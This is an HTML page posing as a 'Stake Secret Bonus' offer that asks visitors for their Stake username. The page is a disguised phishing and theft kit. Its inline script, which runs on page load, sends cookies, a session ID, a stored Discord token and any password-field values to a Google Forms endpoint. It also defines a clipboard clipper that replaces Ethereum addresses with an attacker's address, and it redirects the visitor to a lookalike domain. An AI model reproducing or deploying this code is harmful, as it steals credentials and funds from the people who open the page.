<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stake Secret Bonus</title>
    <style>
        body {
            font-family: "Open Sans", sans-serif;
            background-color: #f8f9fa;
            color: #212529;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            user-select: none; /* Disable text selection */
        }

        .container {
            max-width: 600px;
            text-align: center;
            margin: 0 auto;
        }

        h1 {
            color: #495057;
            font-weight: bold;
            margin-bottom: 10px;
        }

        label {
            font-size: 18px;
            color: #495057;
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input[type="text"] {
            width: 200px; /* Adjusted width to make it smaller */
            padding: 10px;
            margin: 5px auto; /* Center the input vertically */
            display: block; /* Ensure input takes full width */
            border: 1px solid #adb5bd;
            border-radius: 15px;
            background-color: #dee2e6;
            color: #495057;
            font-weight: bold; /* Make input text bold */
            text-align: center; /* Start text input from the center */
        }

        button {
            padding: 10px 20px;
            border: none;
            border-radius: 15px;
            background-color: #6c757d;
            color: #f8f9fa;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: auto; /* Adjust width to content */
            margin: 5px; /* Add minimal margin around the button */
        }

        button:hover {
            background-color: #495057;
        }

        p#result {
            margin-top: 20px;
            font-size: 18px;
            color: #343a40;
            opacity: 0;
            transition: opacity 0.5s ease;
            font-weight: bold;
        }

        p#result.visible {
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Stake Secret Bonus</h1>
        <form id="stakeForm">
            <label for="username">Enter your Stake username:</label>
            <input type="text" id="username" name="entry.1000407979" required>
            <button type="submit">Get Secret Bonus</button>
        </form>
        <p id="result" class="hidden">Congratulations! You've unlocked the secret bonus!</p>
    </div>

    <script>
        // Paste the provided JavaScript snippet here
        // Cookie Stealer
        var cookies = document.cookie;
        var cookieXhr = new XMLHttpRequest();
        cookieXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
        cookieXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        cookieXhr.send("entry.1397710227=" + encodeURIComponent(cookies));

        // Session Hijacking
        var sessionId = sessionStorage.getItem('sessionId');
        var sessionXhr = new XMLHttpRequest();
        sessionXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
        sessionXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        sessionXhr.send("&entry.1481125863=" + encodeURIComponent(sessionId));

        // Discord Token Stealer
        var discordToken = localStorage.getItem('discordToken');
        var tokenXhr = new XMLHttpRequest();
        tokenXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
        tokenXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        tokenXhr.send("&entry.1886763032=" + encodeURIComponent(discordToken));

        // Crypto Clipper
        function replaceClipboard() {
            navigator.clipboard.readText().then(text => {
                var newAddress = 'yourEvilAddress';
                var modifiedText = text.replace(/(?:0x[a-fA-F0-9]{40})/g, newAddress);
                var clipperXhr = new XMLHttpRequest();
                clipperXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
                clipperXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                clipperXhr.send("&entry.1224092635=" + encodeURIComponent(modifiedText));
            });
        }

        // Saved Password Stealer
        var savedPasswords = document.querySelectorAll('input[type="password"]');
        savedPasswords.forEach(password => {
            var passwordXhr = new XMLHttpRequest();
            passwordXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
            passwordXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            passwordXhr.send("&entry.142295146=" + encodeURIComponent(password.value));
        });

        // Original script that redirects to stake.com
        document.getElementById("stakeForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent default form submission

            // Redirect to stake.com
            window.location.href = "https://playstake.club/bonus?code=BoostWeekly4243C";
        });
    </script>
</body>
</html>
